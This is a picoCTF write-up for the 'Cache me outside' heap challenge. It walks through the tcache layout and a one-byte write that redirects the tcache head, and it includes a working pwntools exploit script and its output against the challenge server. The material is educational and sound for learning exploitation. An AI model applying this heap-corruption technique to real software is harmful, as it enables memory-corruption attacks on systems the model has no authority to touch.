---
title: "Cache me outside"
date: "2025-09-16"
tags: ["picoCTF", "tcache", "heap"]
---

In this challenge we are given three files:

* heapedit (the binary)
* Makefile (information about how the program was compiled)
* libc.so.6

If we try to run the binary we will see that it does not work:

```c
./heapedit
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
```

Since they give us a custom libc, we are going to use our trusted tool, **pwninit**. We will also create a `flag.txt` file to avoid possible errors later on.

```c
You may edit one byte in the program.
Address: 10
Value: 10
t help you: this is a random string.
```

Now we can start to see what the program does. It looks like, by giving it an address and a value, we can change one byte at will at an address we control.

Let's take a look at the heap of the running program:

```c
0x6037f00x00000000000000000x0000000000000091................
0x6038000x00000000000000000x662072756f592021........! Your f <-- tcachebins[0x90][1/2]
0x6038100x203a73692067616c0x706d616320736747lag is: Ggs camp
0x6038200x0000000a216e6f650x0000000000000000eon!............
...
0x6038900x00000000006038000x276e6f7720736968.8`.....his won'<-- tcachebins[0x90][0/2]
0x6038a00x7920706c656820740x73696874203a756ft help you: this
0x6038b00x61722061207369200x727473206d6f646eis a random str
...
```

As we can see, there is a lot of information here. At the start there is the tcache chunk, and then several chunks. Two of them are free and sitting in the tcache. If we think about it for a moment, we can guess that the program, the way it works, prints to the console the contents of the chunk at the head of the list. That is, there are two chunks in `tcachebins` and the one at the head is the one printed on screen.

If we keep looking, we can see that the other chunk holds a sentence and the flag with it. Between the address of one chunk and the other there is only one byte of difference. So if we put that together with the fact that we can change one byte at will, we know we have to make the head of `tcachebins` go from `0x603890` to `0x603800`, changing the last byte from `0x90` to `0x00`.

The thing is we have no reference point to work out addresses. Let's first check whether the binary has PIE:

```c
checksec
File:     /home/ub1cu0/Desktop/PWN/picoCTF/Cache_me_outside/heapedit_patched
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'.'
Stripped:   No
```

It has no PIE, so if we get an offset it will always be the same. First we need to know how the address value works in the program:

```c
*(undefined *)((long)direccion + (long)local_a0) = valor;
```

As we can see, our address is really a decimal offset from another address. All that is left is to find out what that other address is:

```c
for (local_a4 = 0; local_a4 < 7; local_a4 = local_a4 + 1) {
    local_98 = (undefined8 *)malloc(0x80);
    if (direccion_base == (undefined8 *)0x0) {
      direccion_base = local_98;
    }
    *local_98 = 0x73746172676e6f43;
    local_98[1] = 0x662072756f592021;
    local_98[2] = 0x203a73692067616c;
    *(undefined *)(local_98 + 3) = 0;
    strcat((char *)local_98,local_58);
}
```

From this we know that the base address is the one of the first allocated chunk. Let's work out the distance between that chunk and the address we want to change:

```c
// Primero miramos dónde se guarda la cabeza que queremos modificar 
pwndbg> tcache
tcache is pointing to: 0x602010 for thread 1
{
  counts = "\000\000\000\000\000\000\000\002", '\000' <repeats 55 times>,
  entries = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x603890, 0x0 <repeats 56 times>}
}
pwndbg> dq 0x602010 20
...
pwndbg> db 0x602080 16
0000000000602080     00 00 00 00 00 00 00 00 90 38 60 00 00 00 00 00 // 8 bytes basura
```

We get the address of the first chunk with the `vis` command in pwndbg.

Now that we have the data we need, we can write the exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./heapedit_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("mercury.picoctf.net", 31153)

def main():
    io = conn()
    
    offset = -0x1420 + 0x08
    valor = 0x00

    info(f'Offset = {offset}')

    io.sendlineafter(b'Address: ', str(offset).encode())
    io.sendlineafter(b'Value: ', "\0")
    io.interactive()

if __name__ == "__main__":
    main()
```

And the output:

```c
[+] Opening connection to mercury.picoctf.net on port 31153: Done
[*] Offset = -5144
...
lag is: picoCTF{SECRET}
...
[*] Got EOF while reading in interactive
```

It works, thanks for reading!
